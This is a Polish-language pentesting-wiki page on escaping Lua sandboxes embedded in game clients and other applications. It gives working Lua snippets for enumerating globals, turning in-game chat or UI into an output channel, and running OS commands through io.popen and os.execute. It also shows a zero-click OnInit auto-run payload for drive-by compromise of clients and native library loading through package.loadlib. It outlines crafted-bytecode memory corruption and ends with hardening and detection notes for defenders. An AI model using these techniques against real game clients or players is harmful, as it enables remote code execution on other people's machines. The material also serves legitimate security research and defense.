# Ominięcie Lua sandboxes (embedded VMs, game clients)

Ta strona zawiera praktyczne techniki służące do enumeracji i wydostawania się z Lua „sandboxów” osadzonych w aplikacjach (zwłaszcza game clients, plugins lub in-app scripting engines). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia dostęp do potężnych globali, które umożliwiają wykonanie dowolnych poleceń, a nawet natywne uszkodzenie pamięci, gdy udostępnione są bytecode loaders.

Najważniejsze idee:
- Traktuj VM jak nieznane środowisko: enumeruj _G i sprawdzaj, do których niebezpiecznych prymitywów można uzyskać dostęp.
- Gdy stdout/print jest zablokowane, wykorzystaj dowolny kanał UI/IPC dostępny w VM jako sink wyjścia, aby obserwować wyniki.
- Jeśli io/os są udostępnione, często uzyskujesz bezpośrednie wykonywanie poleceń (io.popen, os.execute).
- Jeśli udostępnione są load/loadstring/loadfile, wykonywanie spreparowanego Lua bytecode może w niektórych wersjach podważyć bezpieczeństwo pamięci (weryfikatory ≤5.1 można obejść; w 5.2 weryfikator usunięto), umożliwiając zaawansowaną eksploatację.

## Enumeracja sandboxed environment

- Zrzuć globalne środowisko, aby zinwentaryzować dostępne tabele/funkcje:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Jeśli print() nie jest dostępne, wykorzystaj ponownie kanały dostępne w VM. Przykład z VM skryptu systemu mieszkań w MMO, gdzie wyjście czatu działa dopiero po wywołaniu dźwięku; poniższy kod tworzy niezawodną funkcję wyjścia:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Uogólnij ten wzorzec dla swojego celu: dowolne pole tekstowe, toast, logger lub callback UI, który akceptuje ciągi znaków, może służyć jako stdout podczas rekonesansu.

## Bezpośrednie wykonywanie poleceń, jeśli io/os jest udostępnione

Jeśli sandbox nadal udostępnia standardowe biblioteki io lub os, prawdopodobnie masz natychmiastowe wykonywanie poleceń:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Uwagi:

- Wykonanie odbywa się wewnątrz procesu klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie zapobiegnie tworzeniu procesów w VM.
- Sprawdź również: package.loadlib (ładowanie dowolnych bibliotek DLL/.so), require z native modules, ffi w LuaJIT (jeśli jest dostępne) oraz bibliotekę debug (może podnosić uprawnienia wewnątrz VM).

## Wyzwalacze zero-click za pośrednictwem callbacków auto-run

Jeśli aplikacja hosta przesyła skrypty do klientów, a VM udostępnia hooki auto-run (np. OnInit/OnLoad/OnEnter), umieść tam payload, aby przeprowadzić drive-by compromise natychmiast po załadowaniu skryptu:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Każdy równoważny callback (OnLoad, OnEnter itd.) uogólnia tę technikę, gdy skrypty są automatycznie przesyłane do klienta i wykonywane.

## Niebezpieczne primitives do wyszukania podczas recon

Podczas enumeracji _G zwróć szczególną uwagę na:
- io, os: io.popen, os.execute, file I/O, dostęp do env.
- load, loadstring, loadfile, dofile: wykonywanie source lub bytecode; obsługa ładowania niezaufanego bytecode.
- package, package.loadlib, require: dynamiczne ładowanie bibliotek i powierzchnia modułów.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo oraz hooks.
- Tylko LuaJIT: ffi.cdef, ffi.load do bezpośredniego wywoływania native code.

Minimalne przykłady użycia (jeśli są dostępne):

API loadera Lua zmieniło się między wersjami: w Lua 5.1 `load` odczytuje dane z funkcji reader, a `loadstring` odczytuje je z łańcucha znaków; `load` w Lua 5.2 akceptuje zarówno łańcuch znaków, jak i funkcję reader, a `loadstring` jest przestarzałym odpowiednikiem.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opcjonalna eskalacja: nadużywanie loaderów Lua bytecode

Gdy load/loadstring/loadfile są dostępne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do ujawnienia i uszkodzenia pamięci. Najważniejsze fakty:
- Lua ≤ 5.1 zawierał wbudowany bytecode verifier, dla którego znane są obejścia.<sup>[[4]](#references)</sup>
- Lua 5.2 całkowicie usunął verifier (oficjalne stanowisko: aplikacje powinny po prostu odrzucać precompiled chunks), co poszerza attack surface, jeśli ładowanie bytecode nie jest zabronione.<sup>[[2]](#references)[[3]](#references)</sup>
- Typowy workflow obejmuje: leak pointerów za pomocą outputu w VM, spreparowanie bytecode w celu utworzenia type confusion (np. wokół FORLOOP lub innych opcode’ów), a następnie przejście do arbitrary read/write lub wykonania native code.<sup>[[2]](#references)[[4]](#references)</sup>

Ta ścieżka zależy od konkretnego engine/version i wymaga RE. Zobacz references, aby zapoznać się ze szczegółowymi analizami, exploitation primitives i przykładami gadgetów w grach.

## Uwagi dotyczące wykrywania i hardeningu (dla defenderów)

- Po stronie serwera: odrzucaj lub przepisuj user scripts; stosuj allowlist bezpiecznych API; usuń albo powiąż z pustymi implementacjami io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Po stronie klienta: uruchamiaj Lua z minimalnym _ENV, zabroń ładowania bytecode, ponownie wprowadź rygorystyczny bytecode verifier lub signature checks oraz zablokuj tworzenie procesów z procesu klienta.
- Telemetria: generuj alerty dotyczące tworzenia gameclient → child process krótko po załadowaniu skryptu; koreluj je ze zdarzeniami UI/chat/script.

## References

- [1] [Ten dom jest nawiedzony: RCE sprzed dekady w kliencie AION (z housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Analiza bytecode: rozwiązywanie problemów bezpieczeństwa Lua w Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Dyskusja na temat usunięcia bytecode verifiera](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist z obejściami i uwagami dotyczącymi verifiera)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Podręcznik referencyjny Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Podręcznik referencyjny Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
